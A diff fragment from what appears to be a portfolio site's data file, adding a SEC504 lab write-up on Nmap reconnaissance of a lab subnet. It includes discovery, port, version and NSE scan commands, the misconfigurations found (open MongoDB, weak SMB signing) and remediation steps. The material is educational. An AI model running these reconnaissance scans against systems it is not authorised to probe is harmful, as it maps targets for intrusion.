+      { src: "/labs/ai-incident-handling-105228.png", alt: "Generated documentation", caption: "Baseline vs Investigation usage guide with Compare-Object" },
+      { src: "/labs/ai-incident-handling-105334.png", alt: "IR playbook system prompt", caption: "gedit IRplaybook.txt: expert-IR system prompt with MITRE ATT&CK" },
+      { src: "/labs/ai-incident-handling-105417.png", alt: "Load playbook prompt", caption: "Playbook system prompt loaded into a fresh gpt-4.1 conversation" },
+      { src: "/labs/ai-incident-handling-105447.png", alt: "Model asks for the EOI", caption: "gpt-4.1 asks the analyst to describe the Event of Interest" },
+      { src: "/labs/ai-incident-handling-105700.png", alt: "Provide the Event of Interest", caption: "EOI: CEO-workstation breach with genusight IOCs" },
+    ],
+  },
+  {
+    id: 25,
+    courseSlug: "sec504",
+    slug: "nmap-network-discovery",
+    title: "Lab 2.1 - Network Discovery and Service Enumeration with Nmap",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Network Reconnaissance",
+    level: "SEC504",
+    date: "Jun 2026",
+    artifacts: "Sanitized Nmap terminal output from the SEC504 Slingshot Linux lab against the 172.30.0.0/24 range",
+    context:
+      "This lab works the full Nmap reconnaissance funnel against a lab subnet (172.30.0.0/24): start with host discovery, narrow to open ports, fingerprint service versions, and finally run NSE scripts to extract detailed configuration from the interesting services. It also contrasts unprivileged and privileged scans to show how scan technique changes what you can see, and ends by finding three real misconfigurations: SSH hidden on a non-standard port, an unauthenticated MongoDB instance, and an SMB server that does not require message signing.",
+    summary:
+      "Ran the Nmap recon funnel across 172.30.0.0/24: a privileged ARP ping sweep (sudo nmap -sn) found a host (172.30.0.26) that the unprivileged sweep missed, then full TCP connect scans (-sT -p 1-65535) and version detection (-sV) mapped the services. Findings included Dropbear SSH 2022.83 hiding on non-standard port 2430 plus nginx and MariaDB on 172.30.0.20, an exposed MongoDB 5.0.27 on 172.30.0.26 that the mongodb-databases NSE script enumerated without authentication (config, local, admin, builds), and an SMB/NetBIOS server (FILESTOR) on 172.30.0.114 whose smb2-security-mode reported message signing enabled but not required. Saved the MongoDB scan with -oN for reporting.",
+    whyThisMatters:
+      "Nmap is the first tool on both sides of an engagement: attackers map your attack surface with it, and defenders use the exact same output to find the exposures before someone else does. Knowing the funnel (discovery, ports, versions, scripts) and reading the results critically is what turns a wall of port numbers into actionable findings like 'this MongoDB answers queries with no password.' The unprivileged-vs-privileged contrast also teaches a lesson that bites real assessments: the scan technique you choose determines what you are even able to find.",
+    tldr: [
+      "A privileged ARP ping sweep (sudo nmap -sn) found a live host the unprivileged sweep missed entirely",
+      "Mapped services with full-range -sT -p 1-65535 then -sV: caught Dropbear SSH hiding on port 2430, plus nginx and MariaDB",
+      "NSE scripts found an unauthenticated MongoDB 5.0.27 (enumerated its databases) and an SMB server not requiring message signing",
+    ],
+    skillsDemonstrated: [
+      "Nmap host discovery (ICMP/TCP vs ARP ping sweeps)",
+      "Privileged vs unprivileged scan tradeoffs",
+      "Full-range TCP port scanning and version detection (-sV)",
+      "Nmap Scripting Engine (NSE) enumeration (-sC, --script)",
+      "Service misconfiguration identification (exposed DB, weak SMB signing, non-standard SSH)",
+      "Scan output capture for reporting (-oN)",
+    ],
+    tools: ["Nmap 7.60", "NSE (mongodb-databases, smb2-security-mode, nbstat)", "Slingshot Linux", "CLI"],
+    steps: [
+      "Host discovery: ping sweep the subnet unprivileged, then again with sudo (ARP)",
+      "Compare the two sweeps to see which hosts each technique reveals",
+      "Default TCP connect scan of 172.30.0.20, then the full 65,535-port range",
+      "Version-detect the open ports on 172.30.0.20 with -sV",
+      "Full-range scan 172.30.0.26 and version-detect the open port",
+      "Run default NSE scripts (-sC) against the MongoDB port and save output with -oN",
+      "Run a targeted --script mongodb-databases against the exposed instance",
+      "Full-range scan 172.30.0.114 and run SMB NSE scripts on 139/445",
+    ],
+    stepDetails: [
+      {
+        title: "Host discovery, unprivileged then privileged",
+        description:
+          "Ran a no-port ping sweep of the whole range: nmap -n -sn 172.30.0.1-254 found 4 hosts up (.1, .20, .114, .152). Re-running the same sweep with sudo found 5 hosts up, including 172.30.0.26, and returned MAC addresses. With root on the local segment Nmap uses ARP for discovery, which finds hosts that ignore ICMP and the unprivileged TCP probes. A host you never discover is a host you never assess.",
+        command: "nmap -n -sn 172.30.0.1-254\nsudo nmap -n -sn 172.30.0.1-254",
+        commandBreakdown: "-n: no reverse-DNS\n-sn: host discovery only, no port scan\nsudo: enables ARP discovery + MAC resolution on the local segment",
+        screenshot: "/labs/nmap-discovery-142347.png",
+      },
+      {
+        title: "Default then full-range TCP scan of .20",
+        description:
+          "Scanned 172.30.0.20 with a TCP connect scan. The default top-1000 ports showed 23/telnet filtered, 80/http open, 135/msrpc filtered, 443/https open, 445/microsoft-ds filtered, and 3306/mysql open. Re-running across all 65,535 ports (-p 1-65535) surfaced one more: 2430/tcp open, labeled 'venus' by Nmap's port-to-service guess. The lesson is that the default scan misses high ports, and attackers deliberately park services up there.",
+        command: "sudo nmap -n -sT 172.30.0.20\nsudo nmap -n -sT -p 1-65535 172.30.0.20",
+        commandBreakdown: "-sT: full TCP connect scan\n-p 1-65535: every TCP port, not just the top 1000",
+        screenshot: "/labs/nmap-discovery-142721.png",
+      },
+      {
+        title: "Version-detect the .20 services",
+        description:
+          "Ran -sV against the open ports (80, 443, 2430, 3306). The versions told the real story: 80 and 443 were nginx, 3306 was MySQL 5.5.5-10.11.6-MariaDB, and 2430, the port Nmap had guessed as 'venus', was actually Dropbear sshd 2022.83 (SSH protocol 2.0). SSH on a non-standard high port is a classic move to slip past port-based monitoring; only version detection, not the port number, reveals it.",
+        command: "sudo nmap -n -sT -sV -p 80,443,2430,3306 172.30.0.20",
+        commandBreakdown: "-sV: probe open ports to identify the service and version\nVersion detection corrects Nmap's port-number guesses",
+        screenshot: "/labs/nmap-discovery-142954.png",
+      },
+      {
+        title: "Find and version-detect MongoDB on .26",
+        description:
+          "Full-range scanned 172.30.0.26 (the host only the privileged sweep had found): 80 and 443 filtered, but 27017/tcp open, which is MongoDB's default port. A targeted -sV confirmed MongoDB 5.0.27. Port 27017 reachable from the network is itself a finding worth chasing, because MongoDB has a long history of being deployed with no authentication.",
+        command: "sudo nmap -n -sT -p 1-65535 172.30.0.26\nsudo nmap -n -sT -p 27017 -sV 172.30.0.26",
+        screenshot: "/labs/nmap-discovery-143233.png",
+      },
+      {
+        title: "NSE enumeration of MongoDB and save output",
+        description:
+          "Ran the default script set (-sC) against port 27017. The mongodb-databases and mongodb-info scripts answered with no authentication: a full database listing (config, local, admin, builds with sizes on disk), build info, version 5.0.27, and the OpenSSL/storage-engine details. An unauthenticated MongoDB exposed to the network is a critical finding: anyone who can reach the port can read the data. Re-ran with -oN nmap_mongodb_scan.txt to save the evidence for the report, then confirmed the saved file with head.",
+        command: "sudo nmap -n -sT -p 27017 -sC 172.30.0.26\nsudo nmap -n -sT -p 27017 -sC -oN nmap_mongodb_scan.txt 172.30.0.26\nhead nmap_mongodb_scan.txt",
+        commandBreakdown: "-sC: run the default safe NSE script category\n-oN: write normal (human-readable) output to a file",
+        screenshot: "/labs/nmap-discovery-143450.png",
+      },
+      {
+        title: "Targeted mongodb-databases script",
+        description:
+          "Ran a single NSE script directly with --script mongodb-databases to re-pull just the database inventory (builds, admin, local, config) in 0.50 seconds. Targeting one script instead of the whole default set is faster and produces a cleaner artifact when you already know exactly what you want to confirm.",
+        command: "sudo nmap -n -sT -p 27017 172.30.0.26 --script mongodb-databases",
+        commandBreakdown: "--script <name>: run a specific NSE script instead of a category",
+        screenshot: "/labs/nmap-discovery-144124.png",
+      },
+      {
+        title: "Scan .114 and enumerate SMB",
+        description:
+          "Full-range scanned 172.30.0.114: 139/netbios-ssn and 445/microsoft-ds open. Running default scripts on those ports returned the SMB host scripts: nbstat resolved the NetBIOS name FILESTOR, and smb2-security-mode reported SMB 2.10 with 'Message signing enabled but not required.' Signing enabled-but-not-required leaves the server open to SMB relay attacks, because a man-in-the-middle can strip the optional signing. The name FILESTOR also hints at a file server worth prioritizing.",
+        command: "sudo nmap -n -sT -p 1-65535 172.30.0.114\nsudo nmap -n -sT -sC -p 139,445 172.30.0.114",
+        commandBreakdown: "-sC on 139/445: runs the SMB/NetBIOS NSE scripts (nbstat, smb2-security-mode, smb2-time)",
+        screenshot: "/labs/nmap-discovery-143847.png",
+      },
+    ],
+    outcome:
+      "Worked the Nmap funnel end to end on 172.30.0.0/24 and surfaced three concrete misconfigurations. A privileged ARP sweep found a host (172.30.0.26) the unprivileged sweep missed; full-range scanning plus -sV caught Dropbear SSH hiding on port 2430 alongside nginx and MariaDB on .20; NSE confirmed an unauthenticated MongoDB 5.0.27 on .26 by listing its databases; and SMB scripts on .114 (FILESTOR) showed message signing was not required. The MongoDB evidence was saved with -oN for reporting.",
+    nextStepsInProduction:
+      "Treat the unauthenticated MongoDB as a critical: enable authentication, bind it to localhost or a private interface, and firewall 27017 immediately, then audit access logs for prior unauthorized reads. Move Dropbear SSH back to a managed port behind key-based auth and monitoring, since a non-standard port is obscurity, not security. Enforce 'require message signing' on the FILESTOR SMB server to close the relay path. Schedule recurring authenticated Nmap (or a dedicated scanner) sweeps and diff results over time so newly exposed services and version drift get flagged automatically.",
+    securityControlsRelevant: [
+      "Authentication and network binding on database services (MongoDB)",
+      "Host-based and network firewalls restricting management ports",
+      "Mandatory SMB message signing to prevent relay attacks",
+      "Key-based SSH on managed ports with monitoring (not port obscurity)",
+      "Recurring authenticated vulnerability/port scanning with diffing",
+      "Network segmentation limiting east-west reachability to services",
+    ],
+    keyFindings: [
+      "Privileged ARP sweep found 172.30.0.26, which the unprivileged ICMP/TCP sweep missed",
+      "172.30.0.20: nginx (80/443), MariaDB 10.11.6 (3306), and Dropbear SSH 2022.83 on non-standard port 2430",
+      "172.30.0.26: MongoDB 5.0.27 on 27017 enumerable without authentication (config, local, admin, builds)",
+      "172.30.0.114 (FILESTOR): SMB 2.10 with message signing enabled but not required (relay-exposed)",
+      "Saved MongoDB NSE output to nmap_mongodb_scan.txt with -oN for reporting",
+    ],
+    takeaway: [
+      "The unprivileged-versus-privileged contrast is the most important lesson in this lab, and it is easy to skip past. The plain nmap -sn sweep reported four hosts; the sudo sweep reported five, and the extra host (172.30.0.26) was the one running the unauthenticated MongoDB. On a local segment, root lets Nmap use ARP, which finds hosts that ignore ICMP. If your assessment methodology only ever runs unprivileged discovery, the single worst exposure on the network can be invisible to you and fully visible to an attacker already on the segment.",
+      "Version detection earns its runtime every time. Nmap's bare port scan labeled 2430 as 'venus' from its static port-to-name table, which is meaningless. Only -sV revealed it was Dropbear SSH on a non-standard port, a deliberate attempt to hide a remote-access service from anyone scanning the usual port 22. Reading the port number alone would have missed it entirely; the version banner is what turns a number into a finding.",
+      "The MongoDB result is the kind of finding that still causes real breaches. A database listening on its default port that answers a stranger's NSE script with its full database inventory and no password is not a theoretical risk. Exposed MongoDB instances have leaked enormous datasets for exactly this reason. Nmap found it in seconds with -sC. The same scan a defender runs to catch this is the scan an attacker runs to exploit it, which is the whole argument for scanning your own surface first and on a schedule.",
+    ],
+    screenshots: [
+      { src: "/labs/nmap-discovery-142347.png", alt: "Unprivileged vs privileged ping sweep", caption: "sudo nmap -sn finds 172.30.0.26 (5 hosts) that the unprivileged sweep (4 hosts) missed" },
+      { src: "/labs/nmap-discovery-142721.png", alt: "Default vs full-range TCP scan of .20", caption: "-p 1-65535 surfaces 2430/tcp beyond the default top-1000 ports" },
+      { src: "/labs/nmap-discovery-142954.png", alt: "Version detection on .20", caption: "-sV: port 2430 is Dropbear SSH 2022.83, plus nginx and MariaDB 10.11.6" },
+      { src: "/labs/nmap-discovery-143233.png", alt: "Full-range scan of .26", caption: "172.30.0.26: 27017/tcp open (MongoDB)" },
+      { src: "/labs/nmap-discovery-143351.png", alt: "Version detection on MongoDB", caption: "-sV confirms MongoDB 5.0.27 on 27017" },
+      { src: "/labs/nmap-discovery-143450.png", alt: "MongoDB NSE enumeration", caption: "-sC mongodb-databases lists databases with no authentication" },
+      { src: "/labs/nmap-discovery-143646.png", alt: "Saved MongoDB scan output", caption: "-oN nmap_mongodb_scan.txt captures the full mongodb-info output" },
+      { src: "/labs/nmap-discovery-143713.png", alt: "Confirm saved scan file", caption: "head nmap_mongodb_scan.txt verifies the saved evidence" },
+      { src: "/labs/nmap-discovery-143847.png", alt: "SMB enumeration on .114", caption: "139/445 open on FILESTOR; smb2-security-mode: signing enabled but not required" },
+      { src: "/labs/nmap-discovery-144124.png", alt: "Targeted mongodb-databases script", caption: "--script mongodb-databases re-pulls the inventory in 0.50s" },
     ],
   },
 ];
